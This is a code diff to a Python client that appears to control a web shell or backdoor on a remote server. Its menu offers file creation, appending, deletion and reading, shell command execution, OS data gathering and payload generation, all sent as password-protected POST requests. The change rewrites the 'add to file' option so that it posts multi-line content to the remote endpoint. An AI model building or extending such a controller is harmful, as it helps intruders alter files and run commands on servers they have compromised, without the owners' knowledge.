@@ -17,7 +17,7 @@ print(" ")
 treshelp=''' Choose option by number!
  ------------------------
  1. make/overwrite file(1 line)      10. run shell commands(check first)
- 2. add to file (1 line)             11. check if shell commands can run
+ 2. add to file                      11. check if shell commands can run
  3. delete file                      12. get OSdata
  4. cat file                         13. generate new payload
  5. rename file
@@ -36,9 +36,14 @@ while True:
         r = requests.post(path, data = { 'pass' : pa55, 'content' : text, 'filename' : filename })
         print(" file created/overwriten!")
     elif choice == "2":
+        addcontent=""
         addtofile=input(" filename: ")
-        addcontent=input(" content: ")
-        r = requests.post(path, data = { 'pass' : pa55, 'addtofile' : addtofile, 'addcontent' : addcontent })
+        print(''' type 'exit' when you want to quit!
+ contents:''')
+        while addcontent !="exit":
+            addcontent=input(" ")
+            if addcontent !="exit":
+                r = requests.post(path, data = { 'pass' : pa55, 'addtofile' : addtofile, 'addcontent' : addcontent })
         print(" content added!")
     elif choice == "3":
         delete=input(" filename: ")
